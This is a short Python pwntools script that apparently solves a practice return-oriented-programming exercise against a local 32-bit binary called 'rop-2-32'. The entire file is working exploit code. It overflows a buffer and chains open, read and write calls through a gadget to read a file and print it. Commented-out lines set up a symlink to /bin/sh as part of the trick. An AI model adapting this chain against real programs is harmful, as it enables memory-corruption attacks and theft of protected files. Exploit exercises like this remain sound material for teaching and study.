#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-32")

buf = "A" * 0x88 + "BBBB"


"""
0x08048380  read@plt
0x080483b0  open@plt
0x080483d0  write@plt
"""

read = p32(0x08048380)
openn = p32(0x080483b0)
writee = p32(0x080483d0)
pppr = p32(0x08048689)
string = p32(0x8048028)

buf += openn
buf += pppr
#buf += p32(0)
buf += string
buf += p32(0)
buf += p32(0)

buf += read
buf += pppr
buf += p32(0x00000003)
buf += p32(0x804a800)
buf += p32(0x00000100)

buf += writee
buf += pppr
buf += p32(0x00000001)
buf += p32(0x804a800)
buf += p32(0x00000100)

#if os.path.exists("\x01"):
#        os.unlink("\x01")

#os.symlink("/bin/sh","\x01");

p.sendline(buf)
p.interactive()
